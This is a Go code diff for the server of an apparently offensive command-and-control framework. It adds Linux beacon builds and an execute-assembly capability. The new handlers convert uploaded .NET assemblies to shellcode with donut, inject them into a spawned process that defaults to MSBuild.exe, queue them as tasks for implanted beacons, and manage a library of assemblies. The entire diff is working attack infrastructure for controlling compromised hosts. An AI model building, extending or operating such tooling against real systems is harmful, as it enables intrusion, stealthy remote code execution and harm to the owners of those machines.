@@ -227,6 +227,7 @@ func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(encrypted)))
 	if _, err := w.Write(encrypted); err != nil {
 		ui.Errorf("checkin", "write: %v", err)
 	}
@@ -639,6 +640,7 @@ func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
 		JitterPct   int    `json:"jitter_pct"`
 		Format      string `json:"format"`
 		SessionPort int    `json:"session_port"`
+		Platform    string `json:"platform"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		http.Error(w, "bad JSON", http.StatusBadRequest)
@@ -655,6 +657,11 @@ func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	platform := req.Platform
+	if platform == "" {
+		platform = "windows"
+	}
+
 	data, err := builder.Build(builder.BuildParams{
 		ServerHost:       l.Host,
 		ServerPort:       l.Port,
@@ -665,15 +672,20 @@ func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
 		IgnoreCertErrors: l.AutoCert,
 		Format:           req.Format,
 		SessionPort:      req.SessionPort,
+		Platform:         platform,
 	})
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
 		return
 	}
 
-	filename := "beacon.exe"
-	if req.Format == "bin" {
+	var filename string
+	if platform == "linux" {
+		filename = "beacon.elf"
+	} else if req.Format == "bin" {
 		filename = "beacon.bin"
+	} else {
+		filename = "beacon.exe"
 	}
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
@@ -1323,5 +1335,182 @@ func (h *Handler) chatRateLimit(username string) bool {
 		h.chatLimiters[username] = lim
 	}
 	return lim.Allow()
+}
+
+func (h *Handler) HandleExecAssembly(w http.ResponseWriter, r *http.Request) {
+	if err := r.ParseMultipartForm(64 << 20); err != nil {
+		http.Error(w, "parse error", http.StatusBadRequest)
+		return
+	}
+
+	beaconIDStr := r.FormValue("beacon_id")
+	beaconIDVal, err := strconv.ParseUint(beaconIDStr, 10, 32)
+	if err != nil {
+		http.Error(w, "invalid beacon_id", http.StatusBadRequest)
+		return
+	}
+	beaconID := uint32(beaconIDVal)
+
+	if h.store.GetBeacon(beaconID) == nil {
+		http.Error(w, "unknown beacon", http.StatusNotFound)
+		return
+	}
+
+	args := r.FormValue("args")
+	spawnto := r.FormValue("spawnto")
+	if spawnto == "" {
+		spawnto = `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe`
+	}
+
+	var assemblyBytes []byte
+	file, _, err := r.FormFile("assembly")
+	if err == nil {
+		defer file.Close()
+		assemblyBytes, err = io.ReadAll(file)
+		if err != nil {
+			http.Error(w, "read error", http.StatusInternalServerError)
+			return
+		}
+	} else {
+		name := r.FormValue("assembly_name")
+		if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
+			http.Error(w, "missing assembly file or invalid assembly_name", http.StatusBadRequest)
+			return
+		}
+		assemblyBytes, err = os.ReadFile(filepath.Join(h.assemblyDir(), name))
+		if err != nil {
+			http.Error(w, "assembly not found in library: "+name, http.StatusNotFound)
+			return
+		}
+	}
+
+	shellcode, err := builder.AssemblyToShellcode(assemblyBytes, args)
+	if err != nil {
+		http.Error(w, "donut conversion failed: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	payload := protocol.EncodeExecAssemblyReq(shellcode, spawnto)
+
+	var labelBytes [4]byte
+	if _, err := rand.Read(labelBytes[:]); err != nil {
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+	label := binary.LittleEndian.Uint32(labelBytes[:])
+
+	task := &models.Task{
+		Label:     label,
+		BeaconID:  beaconID,
+		Type:      protocol.TaskExecAssembly,
+		Code:      protocol.CodeExecAssembly,
+		Data:      payload,
+		Status:    models.TaskStatusPending,
+		CreatedAt: time.Now(),
+	}
+
+	if h.sessionListener != nil && h.store.IsSession(beaconID) {
+		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+			Type:   protocol.TaskExecAssembly,
+			Code:   protocol.CodeExecAssembly,
+			Label:  label,
+			Length: uint32(len(payload)),
+		})
+		taskMsg = append(taskMsg, payload...)
+		if err := h.sessionListener.SendTask(beaconID, taskMsg); err != nil {
+			h.store.QueueTask(task)
+		} else {
+			task.Status = models.TaskStatusSent
+			h.store.QueueTask(task)
+		}
+	} else {
+		h.store.QueueTask(task)
+	}
+
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("exec-assembly", fmt.Sprintf("operator '%s' queued execute-assembly for #%d (%d bytes shellcode)", op, beaconID, len(shellcode)))
+
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"label":   label,
+		"status":  "queued",
+		"sc_size": len(shellcode),
+	})
+}
+
+func (h *Handler) assemblyDir() string {
+	home, _ := os.UserHomeDir()
+	dir := filepath.Join(home, ".bebop", "assemblies")
+	os.MkdirAll(dir, 0700)
+	return dir
+}
+
+func (h *Handler) HandleAssemblyUpload(w http.ResponseWriter, r *http.Request) {
+	if err := r.ParseMultipartForm(64 << 20); err != nil {
+		http.Error(w, "parse error", http.StatusBadRequest)
+		return
+	}
+	name := r.FormValue("name")
+	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
+		http.Error(w, "invalid name", http.StatusBadRequest)
+		return
+	}
+	file, _, err := r.FormFile("assembly")
+	if err != nil {
+		http.Error(w, "missing assembly file", http.StatusBadRequest)
+		return
+	}
+	defer file.Close()
+	data, err := io.ReadAll(file)
+	if err != nil {
+		http.Error(w, "read error", http.StatusInternalServerError)
+		return
+	}
+	if err := os.WriteFile(filepath.Join(h.assemblyDir(), name), data, 0600); err != nil {
+		http.Error(w, "write error", http.StatusInternalServerError)
+		return
+	}
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("assembly", fmt.Sprintf("operator '%s' uploaded assembly: %s (%d bytes)", op, name, len(data)))
+	json.NewEncoder(w).Encode(map[string]interface{}{"name": name, "size": len(data)})
+}
+
+func (h *Handler) HandleAssemblyList(w http.ResponseWriter, r *http.Request) {
+	entries, _ := os.ReadDir(h.assemblyDir())
+	type asmEntry struct {
+		Name string `json:"name"`
+		Size int64  `json:"size"`
+	}
+	var list []asmEntry
+	for _, e := range entries {
+		if e.IsDir() {
+			continue
+		}
+		info, err := e.Info()
+		if err != nil {
+			continue
+		}
+		list = append(list, asmEntry{Name: e.Name(), Size: info.Size()})
+	}
+	if list == nil {
+		list = []asmEntry{}
+	}
+	json.NewEncoder(w).Encode(list)
+}
+
+func (h *Handler) HandleAssemblyDelete(w http.ResponseWriter, r *http.Request) {
+	name := r.PathValue("name")
+	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
+		http.Error(w, "invalid name", http.StatusBadRequest)
+		return
+	}
+	path := filepath.Join(h.assemblyDir(), name)
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		http.Error(w, "not found", http.StatusNotFound)
+		return
+	}
+	os.Remove(path)
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("assembly", fmt.Sprintf("operator '%s' deleted assembly: %s", op, name))
+	w.WriteHeader(http.StatusNoContent)
 }
 
